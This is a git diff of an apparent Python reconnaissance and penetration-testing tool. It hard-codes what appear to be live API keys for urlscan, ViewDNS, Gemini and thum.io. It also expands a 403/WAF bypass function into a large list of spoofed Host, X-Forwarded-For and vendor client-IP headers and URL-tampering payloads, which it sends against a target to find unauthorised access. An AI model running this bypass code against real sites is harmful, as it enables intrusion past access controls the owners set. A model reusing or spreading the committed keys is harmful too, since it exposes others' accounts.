@@ -20,10 +20,10 @@ from colorama import Fore, Style, init
 from playwright.sync_api import sync_playwright
 
 # --- CONFIGURATION (API KEYS) ---
-URLSCAN_API_KEY = ""
-VIEWDNS_API_KEY = ""
-GEMINI_API_KEY = ""
-THUM_IO_AUTH = "" 
+URLSCAN_API_KEY = "019b3d5b-2b60-7409-911e-28acaad1448f"
+VIEWDNS_API_KEY = "92c5506b68d5884bdfda2774ecd02bd5544caebd"
+GEMINI_API_KEY = "AIzaSyCEoEoCDLg78euG1p9KF6DU7QyFb36KTX0"
+THUM_IO_AUTH = "76073-bbd919f27b3be431bd9965e2ff71de93" 
 
 # Configure Gemini
 genai.configure(api_key=GEMINI_API_KEY)
@@ -878,55 +878,146 @@ def module_webcheck_v2(target):
 
 
 # Helper for 403/WAF Bypass Logic
+
 def attempt_403_bypass(url):
     """
-    Attempts to bypass 403 Forbidden errors using header manipulation 
-    and URL tampering techniques.
+    Ultimate 403 Bypass: Includes Host Spoofing, IP wildcards, and URL Tampering.
+    Sorted from Stealthy (Localhost/Private) -> Aggressive (127.0.0.1/Wildcards).
     """
+    
+    # --- 1. HEADER BYPASS LIST (A to Z Complete) ---
     bypass_headers = [
-        {"X-Originating-IP": "127.0.0.1"},
+        # ==============================================================================
+        # PHASE 1: HOST NAME & PRIVATE NETWORK (Stealthier)
+        # WAFs often trust 'localhost' string or internal Class A/B/C IPs more than 127.0.0.1
+        # ==============================================================================
+        {"Host": "localhost"},
+        {"Host": "admin"},
+        {"Host": "internal"},
+        {"X-Host": "localhost"},
+        {"X-Forwarded-Host": "localhost"},
+        {"X-Forwarded-Server": "localhost"},
+        {"X-HTTP-Host-Override": "localhost"},
+        {"Forwarded": "for=localhost;proto=http;by=localhost"},
+        
+        # Private Internal IPs (Class A, B, C)
+        {"X-Forwarded-For": "10.0.0.1"},        # Common Internal
+        {"X-Real-IP": "10.0.0.1"},
+        {"X-Originating-IP": "10.0.0.1"},
+        {"X-Forwarded-For": "192.168.1.1"},     # Home/Office Router Default
+        {"X-Real-IP": "192.168.1.1"},
+        {"X-Forwarded-For": "172.16.0.1"},      # Enterprise Internal
+        {"X-Forwarded-For": "100.64.0.1"},      # Carrier NAT
+        
+        # IPv6 Localhost
+        {"X-Forwarded-For": "::1"},
+        {"X-Real-IP": "::1"},
+
+        # ==============================================================================
+        # PHASE 2: CLOUD & VENDOR SPECIFIC (AWS, Cloudflare, Akamai)
+        # ==============================================================================
+        {"CF-Connecting-IP": "127.0.0.1"},             # Cloudflare
+        {"True-Client-IP": "127.0.0.1"},               # Akamai/Cloudflare
+        {"Fastly-Client-IP": "127.0.0.1"},             # Fastly
+        {"X-Amzn-Trace-Id": "Root=1-127.0.0.1"},       # AWS
+        {"Akamai-Client-IP": "127.0.0.1"},             # Akamai
+        {"X-Cluster-Client-IP": "127.0.0.1"},          # Generic Load Balancer
+        {"X-Forwarded-Proto": "https"},                # Protocol Bypass
+        {"X-Forwarded-Port": "443"},                   # Port Bypass
+        {"X-BlueCoat-Via": "127.0.0.1"},               # BlueCoat Proxy
+
+
+
+        # ==============================================================================
+        # PHASE 3: WILDCARD LOCALHOST & AGGRESSIVE SPOOFING (The "End" List)
+        # Using 127.x.x.x variations (SSRF Trick) to bypass rigid "127.0.0.1" filters.
+        # ==============================================================================
+        {"X-Forwarded-For": "127.0.0.2"},
+        {"X-Forwarded-For": "127.1.1.1"},
+        {"X-Forwarded-For": "127.0.1.1"},
+        {"X-Forwarded-For": "127.8.8.8"},
+        {"X-Forwarded-For": "127.9.5.11"},       # Random Range
+        {"X-Forwarded-For": "127.123.1.50"},     # Random Range
+        {"X-Forwarded-For": "127.250.251.252"},  # High Range
+        {"X-Forwarded-For": "127.255.255.254"},  # Max Range
+        {"X-Real-IP": "127.42.42.42"},
+        {"Client-IP": "127.99.99.99"},
+
+
+        # ==============================================================================
+        # PHASE 4: THE MASSIVE "127.0.0.1" BLOCK (Standard List)
+        # ==============================================================================
+        {"Host": "127.0.0.1"},
         {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Forwarded-For": "127.0.0.1:80"},
         {"X-Forwarded": "127.0.0.1"},
+        {"X-Forwarded-By": "127.0.0.1"},
         {"Forwarded-For": "127.0.0.1"},
+        {"Forwarded": "127.0.0.1"},
         {"X-Remote-IP": "127.0.0.1"},
         {"X-Remote-Addr": "127.0.0.1"},
         {"X-Client-IP": "127.0.0.1"},
+        {"Client-IP": "127.0.0.1"},
+        {"X-Originating-IP": "127.0.0.1"},
         {"X-Host": "127.0.0.1"},
         {"X-Forwared-Host": "127.0.0.1"},
-        {"X-Custom-IP-Authorization": "127.0.0.1"}
+        {"X-Custom-IP-Authorization": "127.0.0.1"},
+        {"X-Original-URL": "127.0.0.1"},
+        {"X-Rewrite-URL": "127.0.0.1"},
+        {"X-Real-IP": "127.0.0.1"},
+        {"Base-Url": "127.0.0.1"},
+        {"Http-Url": "127.0.0.1"},
+        {"Proxy-Host": "127.0.0.1"},
+        {"Proxy-Url": "127.0.0.1"},
+        {"X-Proxy-Url": "127.0.0.1"},
+        {"X-ProxyUser-Ip": "127.0.0.1"},
+        {"X-Forwarder-For": "127.0.0.1"},  # Typo variant
+        {"Z-Forwarded-For": "127.0.0.1"},  # 'Z' evasion
+        {"X-Wap-Profile": "127.0.0.1"},    # Mobile Gateway
+
+      
+        
+        # IP Encoding (Hex/Integer) - WAFs miss these
+        {"X-Forwarded-For": "2130706433"},       # Integer for 127.0.0.1
+        {"X-Forwarded-For": "0x7f000001"},       # Hex for 127.0.0.1
+        {"X-Forwarded-For": "0177.0000.0000.0001"} # Octal
     ]
     
-    # URL Tampering payloads
-    # If url is http://site.com/admin -> try http://site.com/%2e/admin, etc.
-    payloads = ["/%2e/", "/.", ";/", "..;/", "/..;/"]
+    # 2. URL TAMPERING PAYLOADS
+    payloads = [
+        "/%2e/", "/.", ";/", "..;/", "/..;/", 
+        "/%20", "/%09", "?", "#", "/*"
+    ]
     
     successes = []
 
-    # 1. Header Manipulation
+    # --- EXECUTION: HEADERS ---
     for header in bypass_headers:
         try:
+            # Using verify=False because changing Host header usually breaks SSL
             r = requests.get(url, headers=header, timeout=5, verify=False)
-            if r.status_code == 200:
+            
+            if r.status_code in [200, 302]:
                 key, val = list(header.items())[0]
-                successes.append(f"Header Bypass: {key}: {val}")
+                successes.append(f"Header Bypass [{r.status_code}]: {key}: {val}")
         except:
             pass
 
-    # 2. URL Tampering
+    # --- EXECUTION: URL TAMPERING ---
     if url.endswith("/"):
         base_url = url[:-1]
     else:
         base_url = url
         
     for payload in payloads:
-        # Very basic split logic for demonstration (assumes last segment is target)
         try:
             parts = base_url.split('/')
-            if len(parts) > 3:
+            if len(parts) >= 3:
+                # Inject payload before the last endpoint
                 tampered = "/".join(parts[:-1]) + payload + parts[-1]
                 r = requests.get(tampered, timeout=5, verify=False)
-                if r.status_code == 200:
-                    successes.append(f"URL Bypass: {tampered}")
+                if r.status_code in [200, 302]:
+                    successes.append(f"URL Bypass [{r.status_code}]: {tampered}")
         except:
             pass
 
@@ -1135,16 +1226,32 @@ def module_advanced_tools(target):
              log_step("Running Nuclei on Main Target...", 2)
 
         try:
-            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1800) # 30 mins max
+            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=600) # 10 mins max
             
             if os.path.exists(nuclei_out):
                 findings = []
-                with open(nuclei_out, 'r') as f:
-                    for line in f:
-                        if line.strip():
-                            findings.append(json.loads(line))
+                try:
+                    with open(nuclei_out, 'r', encoding='utf-8') as f:
+                        
+                        data = json.load(f)
+                                         
+                        if isinstance(data, list):
+                            findings = data 
+                        elif data: 
+                            findings.append(data) 
+                except json.JSONDecodeError:
+                    pass
+                except Exception as e:
+                    pass
+
                 results["nuclei_findings"] = findings
-                log_step(f"Nuclei Findings: {len(findings)}", 3)
+           
+                if len(findings) > 0:
+                    log_step(f"Nuclei Findings: {len(findings)}", 3)
+                else:
+                    # Optional: Agar 0 findings hain to log kro ya ignore kro
+                    log_step("Nuclei Findings: 0 (Clean)", 3)
+
                 results["tools_used"].append("Nuclei")
         except Exception as e:
             log_step(f"Nuclei Error: {e}", "error")
